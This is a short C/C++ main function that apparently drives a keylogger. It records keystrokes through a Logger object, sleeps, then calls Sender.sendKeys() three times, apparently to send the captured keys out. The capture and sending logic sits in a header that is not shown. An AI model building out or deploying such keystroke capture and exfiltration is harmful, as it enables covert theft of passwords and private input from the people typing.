#include "KeyLog.h"

int main()
{
	Logger.record();
	Logger.printFrames();

	Sleep(5000);
	
	Sender.sendKeys();
	Sender.sendKeys();
	Sender.sendKeys();
	return 0;
}